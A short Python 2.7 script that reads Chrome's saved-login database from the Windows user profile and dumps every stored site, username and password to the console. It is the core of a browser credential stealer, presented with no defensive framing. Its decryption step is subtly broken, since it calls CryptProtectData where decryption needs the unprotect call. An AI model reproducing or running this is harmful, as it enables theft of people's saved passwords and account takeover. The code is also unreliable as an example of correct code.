# python 2.7
import os
import sqlite3
import win32crypt

def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    #data_path = r'C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptProtectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        print(string)


if __name__=='__main__':
    get_chrome()